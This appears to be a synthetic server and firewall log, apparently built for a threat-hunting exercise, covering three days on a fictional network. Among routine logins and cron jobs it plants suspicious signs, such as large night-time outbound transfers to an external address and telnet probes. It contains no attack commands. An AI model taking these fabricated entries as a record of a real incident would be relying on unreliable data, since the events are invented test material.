+258,2026-03-11 03:08:31,fw01,firewall,ALLOW tcp 10.20.1.21:40201 -> 45.147.230.61:443 bytes=94146328
+259,2026-03-11 03:09:09,db01,cron,(monitor) CMD (/usr/local/bin/healthcheck --quiet)
+260,2026-03-11 03:09:09,fw01,firewall,ALLOW tcp 10.20.1.21:55125 -> 45.147.230.61:443 bytes=93618719
+261,2026-03-11 03:41:43,fw01,firewall,ALLOW tcp 10.20.3.55:44679 -> 10.20.2.40:445 bytes=27824316
+262,2026-03-11 03:45:34,vpn01,cron,(backup) CMD (/usr/local/bin/nightly-backup.sh --target /srv)
+263,2026-03-11 04:11:16,app02,cron,(backup) CMD (/usr/local/bin/nightly-backup.sh --target /srv)
+264,2026-03-11 06:23:41,fs01,sshd,Accepted publickey for monitor from 10.20.9.72 port 43591 ssh2
+265,2026-03-11 06:26:11,web01,nginx,"203.0.113.19 - - ""GET /favicon.ico HTTP/1.1"" 404 153"
+266,2026-03-11 06:30:06,web01,nginx,"203.0.113.7 - - ""GET /favicon.ico HTTP/1.1"" 404 153"
+267,2026-03-11 06:55:36,db01,cron,(rpatel) CMD (/usr/local/bin/report.sh --daily)
+268,2026-03-11 06:56:04,fw01,firewall,ALLOW tcp 10.20.9.61:45644 -> 10.20.2.40:443 bytes=25549
+269,2026-03-11 07:02:00,app02,systemd,Started Session 7060 of user achen.
+270,2026-03-11 07:11:51,web01,nginx,"203.0.113.19 - - ""GET /favicon.ico HTTP/1.1"" 404 153"
+271,2026-03-11 07:27:58,web01,nginx,"198.51.100.42 - - ""GET /api/v2/orders?page=39 HTTP/1.1"" 200 1968"
+272,2026-03-11 07:40:59,vpn01,sshd,Accepted publickey for monitor from 10.20.9.48 port 45793 ssh2
+273,2026-03-11 07:45:05,web02,sshd,Accepted publickey for achen from 10.20.9.14 port 56462 ssh2
+274,2026-03-11 07:52:16,web02,sshd,Accepted publickey for rpatel from 10.20.9.33 port 53494 ssh2
+275,2026-03-11 08:09:22,app02,sshd,pam_unix(sshd:session): session opened for user achen by (uid=0)
+276,2026-03-11 08:18:21,fs01,sudo,backup : TTY=pts/0 ; PWD=/home/backup ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+277,2026-03-11 08:37:13,web02,nginx,"198.51.100.42 - - ""POST /api/v2/session HTTP/1.1"" 201 204"
+278,2026-03-11 08:47:37,web02,sudo,monitor : TTY=pts/0 ; PWD=/home/monitor ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+279,2026-03-11 08:50:14,fw01,firewall,ALLOW tcp 10.20.9.14:42306 -> 10.20.1.11:443 bytes=20723
+280,2026-03-11 08:59:26,web01,sudo,jmorales : TTY=pts/0 ; PWD=/home/jmorales ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+281,2026-03-11 09:27:09,fw01,firewall,ALLOW tcp 10.20.9.61:54702 -> 10.20.2.21:443 bytes=37510
+282,2026-03-11 09:30:17,web02,nginx,"203.0.113.7 - - ""POST /api/v2/session HTTP/1.1"" 201 899"
+283,2026-03-11 09:53:16,fw01,firewall,DENY tcp 203.0.113.7:43070 -> 10.20.1.11:23 bytes=0
+284,2026-03-11 10:07:31,app02,sshd,Failed password for tokafor from 10.20.9.72 port 53533 ssh2
+285,2026-03-11 10:09:30,vpn01,sudo,deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+286,2026-03-11 10:16:27,web01,nginx,"203.0.113.19 - - ""GET /api/v2/orders?page=14 HTTP/1.1"" 200 5346"
+287,2026-03-11 10:17:27,web02,cron,(jmorales) CMD (/usr/local/bin/report.sh --daily)
+288,2026-03-11 10:24:43,app01,cron,(backup) CMD (/usr/local/bin/report.sh --daily)
+289,2026-03-11 10:29:31,app02,systemd,Started Session 8246 of user monitor.
+290,2026-03-11 10:32:16,web01,sshd,Accepted publickey for achen from 10.20.9.14 port 41736 ssh2
+291,2026-03-11 10:50:22,web01,sudo,deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+292,2026-03-11 10:51:32,app02,cron,(backup) CMD (/usr/local/bin/report.sh --daily)
+293,2026-03-11 10:52:03,vpn01,cron,(achen) CMD (/usr/local/bin/report.sh --daily)
+294,2026-03-11 11:07:10,fs01,cron,(deploy) CMD (/usr/local/bin/report.sh --daily)
+295,2026-03-11 11:10:01,fw01,firewall,DENY tcp 203.0.113.19:50778 -> 10.20.1.11:23 bytes=0
+296,2026-03-11 11:19:58,app01,sudo,tokafor : TTY=pts/0 ; PWD=/home/tokafor ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+297,2026-03-11 11:20:15,web01,nginx,"198.51.100.42 - - ""GET /api/v2/orders?page=2 HTTP/1.1"" 200 8423"
+298,2026-03-11 11:22:21,app01,sshd,Accepted publickey for rpatel from 10.20.9.27 port 46155 ssh2
+299,2026-03-11 11:24:13,db01,sshd,pam_unix(sshd:session): session opened for user deploy by (uid=0)
+300,2026-03-11 11:24:53,web01,nginx,"198.51.100.42 - - ""GET /favicon.ico HTTP/1.1"" 404 153"
+301,2026-03-11 11:26:41,app02,sshd,Accepted publickey for swilliams from 10.20.9.72 port 57502 ssh2
+302,2026-03-11 11:47:35,db01,sshd,Accepted publickey for rpatel from 10.20.9.27 port 43864 ssh2
+303,2026-03-11 11:48:14,fw01,firewall,DENY tcp 198.51.100.42:58721 -> 10.20.1.11:23 bytes=0
+304,2026-03-11 12:05:48,web01,nginx,"203.0.113.19 - - ""GET /api/v2/orders?page=7 HTTP/1.1"" 200 1470"
+305,2026-03-11 12:11:18,db01,sshd,pam_unix(sshd:session): session opened for user monitor by (uid=0)
+306,2026-03-11 12:12:06,app01,sshd,Accepted publickey for jmorales from 10.20.9.27 port 53030 ssh2
+307,2026-03-11 12:15:07,app01,sshd,Accepted publickey for backup from 10.20.9.27 port 53110 ssh2
+308,2026-03-11 12:15:45,fw01,firewall,ALLOW tcp 10.20.9.27:47707 -> 10.20.2.21:443 bytes=38220
+309,2026-03-11 12:23:19,web01,nginx,"203.0.113.19 - - ""GET /favicon.ico HTTP/1.1"" 404 153"
+310,2026-03-11 12:31:23,app02,cron,(rpatel) CMD (/usr/local/bin/report.sh --daily)
+311,2026-03-11 12:41:14,web02,nginx,"203.0.113.7 - - ""POST /api/v2/session HTTP/1.1"" 201 523"
+312,2026-03-11 12:48:37,fw01,firewall,DENY tcp 203.0.113.19:55458 -> 10.20.1.11:23 bytes=0
+313,2026-03-11 12:49:02,web01,sudo,tokafor : TTY=pts/0 ; PWD=/home/tokafor ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+314,2026-03-11 12:51:46,app01,sshd,Accepted publickey for backup from 10.20.9.72 port 56462 ssh2
+315,2026-03-11 12:55:23,fw01,firewall,DENY tcp 198.51.100.42:49089 -> 10.20.1.11:23 bytes=0
+316,2026-03-11 12:59:17,web02,sshd,Accepted publickey for jmorales from 10.20.9.48 port 48021 ssh2
+317,2026-03-11 13:26:17,db01,sshd,Accepted publickey for tokafor from 10.20.9.96 port 45612 ssh2
+318,2026-03-11 13:45:35,fs01,sshd,pam_unix(sshd:session): session opened for user swilliams by (uid=0)
+319,2026-03-11 13:53:06,web01,sshd,pam_unix(sshd:session): session opened for user rpatel by (uid=0)
+320,2026-03-11 13:56:05,fw01,firewall,ALLOW tcp 10.20.9.27:56026 -> 10.20.1.21:443 bytes=48974
+321,2026-03-11 14:04:28,app02,systemd,Started Session 2594 of user rpatel.
+322,2026-03-11 14:15:19,web01,nginx,"198.51.100.42 - - ""GET /api/v2/orders?page=19 HTTP/1.1"" 200 3335"
+323,2026-03-11 14:21:24,db01,sshd,pam_unix(sshd:session): session opened for user deploy by (uid=0)
+324,2026-03-11 14:23:24,web01,nginx,"203.0.113.19 - - ""GET /api/v2/orders?page=3 HTTP/1.1"" 200 2413"
+325,2026-03-11 14:44:33,fw01,firewall,ALLOW tcp 10.20.9.48:40531 -> 10.20.2.21:443 bytes=27464
+326,2026-03-11 14:47:14,fw01,firewall,DENY tcp 203.0.113.19:42236 -> 10.20.1.11:23 bytes=0
+327,2026-03-11 15:37:03,fw01,firewall,ALLOW tcp 10.20.9.27:44212 -> 10.20.3.55:443 bytes=46341
+328,2026-03-11 15:44:15,web02,nginx,"198.51.100.42 - - ""POST /api/v2/session HTTP/1.1"" 201 563"
+329,2026-03-11 15:52:55,db01,systemd,Started Session 2241 of user jmorales.
+330,2026-03-11 16:02:20,vpn01,systemd,Started Session 1890 of user achen.
+331,2026-03-11 16:05:45,web01,sshd,Accepted publickey for swilliams from 10.20.9.61 port 48146 ssh2
+332,2026-03-11 16:06:23,fw01,firewall,ALLOW tcp 10.20.9.27:53013 -> 10.20.1.12:443 bytes=21851
+333,2026-03-11 16:39:18,web01,sshd,Failed password for deploy from 10.20.9.27 port 43248 ssh2
+334,2026-03-11 16:45:21,fw01,firewall,ALLOW tcp 10.20.9.96:56424 -> 10.20.1.21:443 bytes=46951
+335,2026-03-11 16:49:34,web02,cron,(tokafor) CMD (/usr/local/bin/report.sh --daily)
+336,2026-03-11 17:02:12,app01,systemd,Started Session 9064 of user jmorales.
+337,2026-03-11 17:18:52,fw01,firewall,DENY tcp 198.51.100.42:47096 -> 10.20.1.11:23 bytes=0
+338,2026-03-11 17:33:45,vpn01,sshd,pam_unix(sshd:session): session opened for user tokafor by (uid=0)
+339,2026-03-11 17:38:46,fw01,firewall,DENY tcp 198.51.100.42:49521 -> 10.20.1.11:23 bytes=0
+340,2026-03-11 17:56:51,fs01,sshd,pam_unix(sshd:session): session opened for user backup by (uid=0)
+341,2026-03-11 18:03:21,web01,sshd,pam_unix(sshd:session): session opened for user tokafor by (uid=0)
+342,2026-03-11 18:10:19,web02,sudo,jmorales : TTY=pts/0 ; PWD=/home/jmorales ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+343,2026-03-11 18:34:10,web01,sshd,Accepted publickey for rpatel from 10.20.9.48 port 55950 ssh2
+344,2026-03-11 18:49:44,vpn01,cron,(achen) CMD (/usr/local/bin/report.sh --daily)
+345,2026-03-11 18:56:28,web01,sshd,pam_unix(sshd:session): session opened for user swilliams by (uid=0)
+346,2026-03-11 19:01:22,fw01,firewall,DENY tcp 198.51.100.42:52162 -> 10.20.1.11:23 bytes=0
+347,2026-03-11 19:19:25,web02,nginx,"203.0.113.19 - - ""POST /api/v2/session HTTP/1.1"" 201 525"
+348,2026-03-11 19:40:20,fs01,sshd,Accepted publickey for rpatel from 10.20.9.14 port 55889 ssh2
+349,2026-03-11 19:44:20,web01,nginx,"203.0.113.7 - - ""GET /api/v2/orders?page=12 HTTP/1.1"" 200 2122"
+350,2026-03-11 19:44:44,app02,systemd,Started Session 6939 of user tokafor.
+351,2026-03-11 19:53:37,app01,sshd,Failed password for rpatel from 10.20.9.61 port 51427 ssh2
+352,2026-03-11 19:54:44,web01,nginx,"198.51.100.42 - - ""GET /api/v2/orders?page=38 HTTP/1.1"" 200 5575"
+353,2026-03-11 20:01:44,fw01,firewall,ALLOW tcp 10.20.9.14:49612 -> 10.20.1.12:443 bytes=32058
+354,2026-03-11 20:06:47,web01,nginx,"198.51.100.42 - - ""GET /api/v2/orders?page=16 HTTP/1.1"" 200 4405"
+355,2026-03-11 20:11:28,app02,cron,(swilliams) CMD (/usr/local/bin/report.sh --daily)
+356,2026-03-11 20:35:04,fs01,sshd,Accepted publickey for rpatel from 10.20.9.27 port 51057 ssh2
+357,2026-03-11 20:36:21,app02,systemd,Started Session 3952 of user deploy.
+358,2026-03-11 20:55:10,web02,nginx,"203.0.113.19 - - ""POST /api/v2/session HTTP/1.1"" 201 861"
+359,2026-03-12 00:11:32,web01,cron,(monitor) CMD (/usr/local/bin/healthcheck --quiet)
+360,2026-03-12 00:35:18,app01,cron,(backup) CMD (/usr/local/bin/nightly-backup.sh --target /srv)
+361,2026-03-12 00:36:03,db01,cron,(backup) CMD (/usr/local/bin/nightly-backup.sh --target /srv)
+362,2026-03-12 00:51:17,web02,cron,(backup) CMD (/usr/local/bin/nightly-backup.sh --target /srv)
+363,2026-03-12 00:57:56,web01,cron,(monitor) CMD (/usr/local/bin/healthcheck --quiet)
+364,2026-03-12 01:59:39,db01,cron,(monitor) CMD (/usr/local/bin/healthcheck --quiet)
+365,2026-03-12 02:11:28,web02,cron,(backup) CMD (/usr/local/bin/nightly-backup.sh --target /srv)
+366,2026-03-12 02:38:02,db01,cron,(monitor) CMD (/usr/local/bin/healthcheck --quiet)
+367,2026-03-12 05:03:46,fw01,firewall,ALLOW tcp 10.20.3.55:55526 -> 10.20.2.40:445 bytes=29609075
+368,2026-03-12 06:12:32,app02,systemd,Started Session 1363 of user monitor.
+369,2026-03-12 06:43:48,fs01,systemd,Started Session 4199 of user swilliams.
+370,2026-03-12 07:15:16,web01,systemd,Started Session 9368 of user tokafor.
+371,2026-03-12 07:28:13,db01,cron,(monitor) CMD (/usr/local/bin/report.sh --daily)
+372,2026-03-12 07:34:46,web02,cron,(monitor) CMD (/usr/local/bin/report.sh --daily)
+373,2026-03-12 07:42:00,app02,cron,(swilliams) CMD (/usr/local/bin/report.sh --daily)
+374,2026-03-12 07:45:58,web01,cron,(achen) CMD (/usr/local/bin/report.sh --daily)
+375,2026-03-12 08:02:34,web01,nginx,"203.0.113.19 - - ""GET /api/v2/orders?page=6 HTTP/1.1"" 200 5508"
+376,2026-03-12 08:11:24,app02,sshd,pam_unix(sshd:session): session opened for user achen by (uid=0)
+377,2026-03-12 08:18:11,web02,sshd,Accepted publickey for jmorales from 10.20.9.48 port 54019 ssh2
+378,2026-03-12 08:24:39,fw01,firewall,DENY tcp 198.51.100.42:54596 -> 10.20.1.11:23 bytes=0
+379,2026-03-12 08:29:20,app02,sshd,Accepted publickey for monitor from 10.20.9.27 port 48099 ssh2
+380,2026-03-12 08:31:59,fw01,firewall,ALLOW tcp 10.20.9.72:52419 -> 10.20.3.55:443 bytes=15817
+381,2026-03-12 08:34:21,web01,nginx,"198.51.100.42 - - ""GET /api/v2/orders?page=8 HTTP/1.1"" 200 4961"
+382,2026-03-12 08:40:09,app02,sshd,pam_unix(sshd:session): session opened for user deploy by (uid=0)
+383,2026-03-12 08:43:32,fw01,firewall,DENY tcp 203.0.113.19:55856 -> 10.20.1.11:23 bytes=0
+384,2026-03-12 08:47:04,vpn01,systemd,Started Session 2066 of user backup.
+385,2026-03-12 08:47:38,fw01,firewall,ALLOW tcp 10.20.9.48:58347 -> 10.20.1.12:443 bytes=31483
+386,2026-03-12 08:52:43,web01,nginx,"198.51.100.42 - - ""GET /favicon.ico HTTP/1.1"" 404 153"
+387,2026-03-12 08:56:06,vpn01,cron,(jmorales) CMD (/usr/local/bin/report.sh --daily)
+388,2026-03-12 09:00:25,db01,cron,(rpatel) CMD (/usr/local/bin/report.sh --daily)
+389,2026-03-12 09:10:13,web02,sshd,Accepted publickey for backup from 10.20.9.96 port 55311 ssh2
+390,2026-03-12 09:24:50,web02,sudo,jmorales : TTY=pts/0 ; PWD=/home/jmorales ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+391,2026-03-12 09:28:20,app01,sshd,pam_unix(sshd:session): session opened for user monitor by (uid=0)
+392,2026-03-12 09:29:12,app02,sshd,Accepted publickey for tokafor from 10.20.9.88 port 58725 ssh2
+393,2026-03-12 09:33:02,fs01,sshd,Accepted publickey for jmorales from 10.20.9.27 port 43902 ssh2
+394,2026-03-12 09:33:38,web01,nginx,"198.51.100.42 - - ""GET /api/v2/orders?page=15 HTTP/1.1"" 200 1847"
+395,2026-03-12 09:40:00,web01,nginx,"203.0.113.7 - - ""GET /api/v2/orders?page=9 HTTP/1.1"" 200 2505"
+396,2026-03-12 09:42:32,fw01,firewall,DENY tcp 203.0.113.7:58717 -> 10.20.1.11:23 bytes=0
+397,2026-03-12 09:43:38,db01,sshd,Accepted publickey for monitor from 10.20.9.14 port 49380 ssh2
+398,2026-03-12 09:44:44,fs01,sshd,pam_unix(sshd:session): session opened for user tokafor by (uid=0)
+399,2026-03-12 09:48:24,fs01,sshd,Accepted publickey for tokafor from 10.20.9.72 port 59814 ssh2
+400,2026-03-12 09:54:32,vpn01,sshd,pam_unix(sshd:session): session opened for user tokafor by (uid=0)
+401,2026-03-12 10:39:56,vpn01,sshd,Accepted publickey for swilliams from 10.20.9.27 port 58357 ssh2
+402,2026-03-12 10:40:09,fw01,firewall,ALLOW tcp 10.20.9.27:50729 -> 10.20.1.12:443 bytes=13554
+403,2026-03-12 10:43:52,fs01,sshd,Accepted publickey for tokafor from 10.20.9.61 port 49273 ssh2
+404,2026-03-12 10:51:22,app02,sshd,pam_unix(sshd:session): session opened for user deploy by (uid=0)
+405,2026-03-12 10:52:52,vpn01,sudo,tokafor : TTY=pts/0 ; PWD=/home/tokafor ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+406,2026-03-12 11:07:42,web01,nginx,"203.0.113.19 - - ""GET /favicon.ico HTTP/1.1"" 404 153"
+407,2026-03-12 11:16:21,web01,sudo,jmorales : TTY=pts/0 ; PWD=/home/jmorales ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+408,2026-03-12 11:19:46,web01,nginx,"203.0.113.7 - - ""GET /api/v2/orders?page=8 HTTP/1.1"" 200 6156"
+409,2026-03-12 11:30:02,vpn01,cron,(tokafor) CMD (/usr/local/bin/report.sh --daily)
+410,2026-03-12 11:47:28,app01,sshd,Accepted publickey for rpatel from 10.20.9.27 port 46166 ssh2
+411,2026-03-12 11:49:47,fw01,firewall,DENY tcp 198.51.100.42:45790 -> 10.20.1.11:23 bytes=0
+412,2026-03-12 11:49:51,vpn01,sshd,Accepted publickey for swilliams from 10.20.9.48 port 58902 ssh2
+413,2026-03-12 12:03:50,web02,nginx,"203.0.113.7 - - ""POST /api/v2/session HTTP/1.1"" 201 357"
+414,2026-03-12 12:07:07,fw01,firewall,ALLOW tcp 10.20.9.14:45687 -> 10.20.1.12:443 bytes=35892
+415,2026-03-12 12:07:59,web01,nginx,"203.0.113.19 - - ""GET /api/v2/orders?page=23 HTTP/1.1"" 200 7833"
+416,2026-03-12 12:27:34,web01,nginx,"203.0.113.7 - - ""GET /api/v2/orders?page=28 HTTP/1.1"" 200 2646"
+417,2026-03-12 12:28:44,web02,nginx,"203.0.113.7 - - ""POST /api/v2/session HTTP/1.1"" 201 888"
+418,2026-03-12 12:41:34,web02,nginx,"198.51.100.42 - - ""POST /api/v2/session HTTP/1.1"" 201 633"
+419,2026-03-12 12:46:47,web02,sshd,pam_unix(sshd:session): session opened for user swilliams by (uid=0)
+420,2026-03-12 12:49:16,web02,sudo,achen : TTY=pts/0 ; PWD=/home/achen ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+421,2026-03-12 12:59:03,app01,systemd,Started Session 2704 of user rpatel.
+422,2026-03-12 13:14:46,web01,nginx,"203.0.113.19 - - ""GET /favicon.ico HTTP/1.1"" 404 153"
+423,2026-03-12 13:17:11,fs01,sshd,Accepted publickey for backup from 10.20.9.88 port 42549 ssh2
+424,2026-03-12 13:28:55,app01,sshd,Accepted publickey for backup from 10.20.9.61 port 44810 ssh2
+425,2026-03-12 13:31:31,web01,nginx,"198.51.100.42 - - ""GET /api/v2/orders?page=4 HTTP/1.1"" 200 4787"
+426,2026-03-12 13:53:16,app02,sshd,Accepted publickey for deploy from 10.20.9.88 port 54392 ssh2
+427,2026-03-12 13:53:46,fw01,firewall,ALLOW tcp 10.20.9.33:44707 -> 10.20.2.21:443 bytes=31105
+428,2026-03-12 14:44:20,web01,sshd,Accepted publickey for rpatel from 10.20.9.72 port 42267 ssh2
+429,2026-03-12 15:05:02,fs01,sshd,Accepted publickey for achen from 10.20.9.33 port 59514 ssh2
+430,2026-03-12 15:07:55,web01,nginx,"198.51.100.42 - - ""GET /api/v2/orders?page=36 HTTP/1.1"" 200 2567"
+431,2026-03-12 15:26:53,fw01,firewall,DENY tcp 203.0.113.19:55204 -> 10.20.1.11:23 bytes=0
+432,2026-03-12 15:37:56,fs01,sshd,Failed password for tokafor from 10.20.9.61 port 45925 ssh2
+433,2026-03-12 15:39:28,web02,systemd,Started Session 4710 of user jmorales.
+434,2026-03-12 15:44:46,app02,cron,(backup) CMD (/usr/local/bin/report.sh --daily)
+435,2026-03-12 15:52:05,fw01,firewall,ALLOW tcp 10.20.9.48:52201 -> 10.20.1.12:443 bytes=49038
+436,2026-03-12 16:15:31,app01,sshd,Accepted publickey for deploy from 10.20.9.48 port 59212 ssh2
+437,2026-03-12 16:19:33,app02,cron,(jmorales) CMD (/usr/local/bin/report.sh --daily)
+438,2026-03-12 16:32:49,db01,systemd,Started Session 9489 of user deploy.
+439,2026-03-12 16:54:33,app01,sshd,Accepted publickey for backup from 10.20.9.27 port 57042 ssh2
+440,2026-03-12 17:09:22,web02,sshd,Accepted publickey for achen from 10.20.9.61 port 48200 ssh2
+441,2026-03-12 17:13:53,app02,sshd,pam_unix(sshd:session): session opened for user jmorales by (uid=0)
+442,2026-03-12 17:36:46,vpn01,sudo,deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+443,2026-03-12 17:50:54,web01,sshd,Accepted publickey for jmorales from 10.20.9.88 port 58738 ssh2
+444,2026-03-12 18:13:23,app02,systemd,Started Session 1365 of user deploy.
+445,2026-03-12 18:14:50,app02,sshd,pam_unix(sshd:session): session opened for user jmorales by (uid=0)
+446,2026-03-12 18:23:06,web01,nginx,"203.0.113.19 - - ""GET /api/v2/orders?page=2 HTTP/1.1"" 200 8472"
+447,2026-03-12 18:25:14,app01,sshd,pam_unix(sshd:session): session opened for user monitor by (uid=0)
+448,2026-03-12 18:46:37,app02,sshd,Failed password for backup from 10.20.9.88 port 53437 ssh2
+449,2026-03-12 18:51:37,fw01,firewall,DENY tcp 203.0.113.19:42243 -> 10.20.1.11:23 bytes=0
+450,2026-03-12 18:58:15,fw01,firewall,DENY tcp 198.51.100.42:59984 -> 10.20.1.11:23 bytes=0
+451,2026-03-12 19:03:21,vpn01,sshd,pam_unix(sshd:session): session opened for user tokafor by (uid=0)
+452,2026-03-12 19:09:18,vpn01,sudo,rpatel : TTY=pts/0 ; PWD=/home/rpatel ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+453,2026-03-12 19:10:42,fs01,sshd,Accepted publickey for deploy from 10.20.9.14 port 51776 ssh2
+454,2026-03-12 19:21:29,web02,nginx,"198.51.100.42 - - ""POST /api/v2/session HTTP/1.1"" 201 530"
+455,2026-03-12 19:31:43,vpn01,sshd,Accepted publickey for achen from 10.20.9.48 port 46767 ssh2
+456,2026-03-12 19:32:18,web01,nginx,"203.0.113.7 - - ""GET /api/v2/orders?page=5 HTTP/1.1"" 200 7202"
+457,2026-03-12 19:34:22,app01,sshd,Accepted publickey for deploy from 10.20.9.61 port 49635 ssh2
+458,2026-03-12 19:53:38,web01,cron,(swilliams) CMD (/usr/local/bin/report.sh --daily)
+459,2026-03-12 19:57:42,app01,cron,(backup) CMD (/usr/local/bin/report.sh --daily)
+460,2026-03-12 20:04:57,fw01,firewall,ALLOW tcp 10.20.9.96:51885 -> 10.20.3.55:443 bytes=48183
+461,2026-03-12 20:26:42,app02,cron,(swilliams) CMD (/usr/local/bin/report.sh --daily)
+462,2026-03-12 20:48:09,app01,sshd,Accepted publickey for rpatel from 10.20.9.33 port 50587 ssh2
+463,2026-03-13 00:14:33,web02,cron,(monitor) CMD (/usr/local/bin/healthcheck --quiet)
+464,2026-03-13 00:30:37,vpn01,cron,(backup) CMD (/usr/local/bin/nightly-backup.sh --target /srv)
+465,2026-03-13 00:34:17,app02,cron,(backup) CMD (/usr/local/bin/nightly-backup.sh --target /srv)
+466,2026-03-13 00:52:44,app01,cron,(backup) CMD (/usr/local/bin/nightly-backup.sh --target /srv)
+467,2026-03-13 03:09:34,vpn01,systemd,logrotate.service: Succeeded.
+468,2026-03-13 03:45:23,app02,sshd,Accepted publickey for backup from 10.20.2.40 port 41881 ssh2
+469,2026-03-13 03:59:28,db01,cron,(backup) CMD (/usr/local/bin/nightly-backup.sh --target /srv)
+470,2026-03-13 04:29:49,web02,cron,(backup) CMD (/usr/local/bin/nightly-backup.sh --target /srv)
+471,2026-03-13 05:04:56,db01,sshd,Accepted publickey for deploy from 10.20.2.21 port 42884 ssh2
+472,2026-03-13 06:09:46,web01,nginx,"203.0.113.19 - - ""GET /api/v2/orders?page=33 HTTP/1.1"" 200 8713"
+473,2026-03-13 06:19:26,web02,nginx,"198.51.100.42 - - ""POST /api/v2/session HTTP/1.1"" 201 565"
+474,2026-03-13 07:00:32,fw01,firewall,DENY tcp 198.51.100.42:43000 -> 10.20.1.11:23 bytes=0
+475,2026-03-13 07:01:07,fw01,firewall,ALLOW tcp 10.20.9.14:55488 -> 10.20.3.55:443 bytes=3788
+476,2026-03-13 07:05:11,web01,sshd,Accepted publickey for jmorales from 10.20.9.96 port 41753 ssh2
+477,2026-03-13 07:16:39,db01,sshd,Accepted publickey for deploy from 10.20.9.72 port 55984 ssh2
+478,2026-03-13 07:28:07,web02,nginx,"203.0.113.7 - - ""POST /api/v2/session HTTP/1.1"" 201 821"
+479,2026-03-13 07:37:43,fs01,cron,(monitor) CMD (/usr/local/bin/report.sh --daily)
+480,2026-03-13 07:45:26,app02,sudo,jmorales : TTY=pts/0 ; PWD=/home/jmorales ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+481,2026-03-13 07:55:29,web01,systemd,Started Session 1326 of user swilliams.
+482,2026-03-13 08:00:04,fw01,firewall,ALLOW tcp 10.20.9.33:40062 -> 10.20.2.22:443 bytes=25030
+483,2026-03-13 08:11:41,app02,sshd,Accepted publickey for rpatel from 10.20.9.48 port 42795 ssh2
+484,2026-03-13 08:24:04,fw01,firewall,ALLOW tcp 10.20.9.96:48719 -> 10.20.1.12:443 bytes=11664
+485,2026-03-13 08:50:31,web01,nginx,"198.51.100.42 - - ""GET /api/v2/orders?page=38 HTTP/1.1"" 200 1869"
+486,2026-03-13 08:58:17,app02,sshd,Accepted publickey for achen from 10.20.9.14 port 54519 ssh2
+487,2026-03-13 09:14:54,web01,nginx,"198.51.100.42 - - ""GET /api/v2/orders?page=15 HTTP/1.1"" 200 8990"
+488,2026-03-13 09:17:45,app01,systemd,Started Session 5537 of user monitor.
+489,2026-03-13 09:18:45,web02,nginx,"203.0.113.7 - - ""POST /api/v2/session HTTP/1.1"" 201 406"
+490,2026-03-13 09:19:26,web01,nginx,"198.51.100.42 - - ""GET /favicon.ico HTTP/1.1"" 404 153"
+491,2026-03-13 09:20:27,vpn01,sudo,deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+492,2026-03-13 09:26:41,web01,nginx,"203.0.113.19 - - ""GET /api/v2/orders?page=2 HTTP/1.1"" 200 6420"
+493,2026-03-13 09:34:58,web02,systemd,Started Session 4614 of user monitor.
+494,2026-03-13 09:36:09,web01,nginx,"203.0.113.19 - - ""GET /favicon.ico HTTP/1.1"" 404 153"
+495,2026-03-13 09:40:44,app01,sshd,Accepted publickey for deploy from 10.20.9.96 port 58738 ssh2
+496,2026-03-13 09:40:58,fw01,firewall,ALLOW tcp 10.20.9.61:56762 -> 10.20.2.22:443 bytes=9968
+497,2026-03-13 10:11:01,app02,sudo,achen : TTY=pts/0 ; PWD=/home/achen ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+498,2026-03-13 11:00:04,fs01,sshd,pam_unix(sshd:session): session opened for user rpatel by (uid=0)
+499,2026-03-13 11:16:16,web02,sudo,swilliams : TTY=pts/0 ; PWD=/home/swilliams ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+500,2026-03-13 11:18:43,db01,cron,(rpatel) CMD (/usr/local/bin/report.sh --daily)
+501,2026-03-13 11:31:09,web01,nginx,"203.0.113.7 - - ""GET /api/v2/orders?page=18 HTTP/1.1"" 200 5827"
+502,2026-03-13 11:44:02,app02,cron,(jmorales) CMD (/usr/local/bin/report.sh --daily)
+503,2026-03-13 11:50:31,web01,nginx,"203.0.113.19 - - ""GET /api/v2/orders?page=30 HTTP/1.1"" 200 3627"
+504,2026-03-13 11:51:25,fw01,firewall,DENY tcp 198.51.100.42:58335 -> 10.20.1.11:23 bytes=0
+505,2026-03-13 11:57:26,web02,nginx,"198.51.100.42 - - ""POST /api/v2/session HTTP/1.1"" 201 572"
+506,2026-03-13 12:05:40,db01,sshd,Failed password for rpatel from 10.20.9.14 port 48303 ssh2
+507,2026-03-13 12:32:02,vpn01,cron,(tokafor) CMD (/usr/local/bin/report.sh --daily)
+508,2026-03-13 12:40:26,app02,sshd,Accepted publickey for deploy from 10.20.9.72 port 57861 ssh2
+509,2026-03-13 12:42:20,web01,cron,(achen) CMD (/usr/local/bin/report.sh --daily)
+510,2026-03-13 12:45:19,web01,nginx,"203.0.113.7 - - ""GET /api/v2/orders?page=15 HTTP/1.1"" 200 4921"
+511,2026-03-13 12:51:02,app02,cron,(rpatel) CMD (/usr/local/bin/report.sh --daily)
+512,2026-03-13 12:57:32,vpn01,sshd,Accepted publickey for rpatel from 10.20.9.14 port 59752 ssh2
+513,2026-03-13 12:59:55,fw01,firewall,ALLOW tcp 10.20.9.33:40754 -> 10.20.2.40:443 bytes=17400
+514,2026-03-13 13:30:55,app02,cron,(swilliams) CMD (/usr/local/bin/report.sh --daily)
+515,2026-03-13 13:37:16,fs01,systemd,Started Session 4297 of user backup.
+516,2026-03-13 13:45:45,app02,sshd,pam_unix(sshd:session): session opened for user rpatel by (uid=0)
+517,2026-03-13 13:51:59,app02,sshd,pam_unix(sshd:session): session opened for user jmorales by (uid=0)
